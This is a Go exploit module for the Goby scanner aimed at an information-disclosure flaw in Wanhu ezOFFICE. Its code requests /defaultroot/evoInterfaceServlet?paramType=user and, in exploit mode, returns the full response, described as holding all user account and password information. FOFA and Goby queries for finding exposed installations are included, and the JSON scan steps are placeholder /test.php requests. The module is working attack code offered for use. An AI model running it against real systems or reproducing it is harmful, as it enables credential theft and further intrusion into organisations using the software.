package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Wanhu ezOFFICE Collaborative office platform is an office automation OA, developed by Wanhu Software.</p><p>At present, there is an information leakage vulnerability in the ezOFFICE collaborative office platform of 10,000 networks, and attackers can obtain all user account and password information through this vulnerability, which is extremely harmful.</p>",
    "Product": "Wanjia-EZOffice-Collaborative-MP",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2023-09-18",
    "Author": "1070488180@qq.com",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\"||title=\"Wanhu ezOFFICE\"|| title=\"ezOffice for iPhone\"||body=\"EZOFFICEUSERNAME\"|| body=\"/defaultroot/js/cookie.js\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\"||title=\"Wanhu ezOFFICE\"|| title=\"ezOffice for iPhone\"||body=\"EZOFFICEUSERNAME\"|| body=\"/defaultroot/js/cookie.js\"",
    "Level": "3",
    "Impact": "<p>Attackers can obtain all user account password information through this vulnerability, and carry out further penetration attacks through account password information, which is extremely harmful.</p>",
    "Recommendation": "<p>The latest patch: 1, pay attention to website <a href=\"https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768.\">https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "getUserList",
            "type": "select",
            "value": "getUserList",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "6.7",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "shterm-Fortres-Machine"
        ]
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE 协同管理平台 /defaultroot/evoInterfaceServlet 信息泄露漏洞",
            "Product": "万户ezOFFICE协同管理平台",
            "Description": "<p>万户网络ezOFFICE协同办公平台是一款办公自动化OA，由万户软件开发。<br></p><p>当下万户网络ezOFFICE协同办公平台存在信息泄露漏洞，攻击者可通过该漏洞获取所有用户账号密码信息，危害极高。</p>",
            "Recommendation": "<p>1、请关注官网最新补丁：<a href=\"https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768\">https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞获取所有用户账号密码信息，通过账号密码信息进行进一步渗透攻击，危害极高。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "ezOFFICE collaborative management platform /defaultroot/evoInterfaceServlet Information Disclosure Vulnerability",
            "Product": "Wanjia-EZOffice-Collaborative-MP",
            "Description": "<p>Wanhu ezOFFICE Collaborative office platform is an office automation OA, developed by Wanhu Software.</p><p>At present, there is an information leakage vulnerability in the ezOFFICE collaborative office platform of 10,000 networks, and attackers can obtain all user account and password information through this vulnerability, which is extremely harmful.</p>",
            "Recommendation": "<p>The latest patch: 1, pay attention to website <a href=\"https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768.\">https://www.whir.net/index.html?sdclkid=A6D_15j6152ixg&amp;bd_vid=4654378339689034768.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Attackers can obtain all user account password information through this vulnerability, and carry out further penetration attacks through account password information, which is extremely harmful.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "Name": "ezOFFICE collaborative management platform /defaultroot/evoInterfaceServlet Information Disclosure Vulnerability",
    "PostTime": "2024-06-13",
    "Is0day": false,
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	sendPayloadsOIJ195lojs06441oio := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig("/defaultroot/evoInterfaceServlet?paramType=user")
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := sendPayloadsOIJ195lojs06441oio(hostInfo); resp!=nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "result:'success'"){
       ss.VulURL = hostInfo.FixedHostInfo + "/defaultroot/evoInterfaceServlet"
					return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, _ := sendPayloadsOIJ195lojs06441oio(expResult.HostInfo); resp!=nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "result:'success'"){
					expResult.Success = true
					expResult.Output = resp.Utf8Html
					return expResult
			}
			return expResult
		},
	))
}
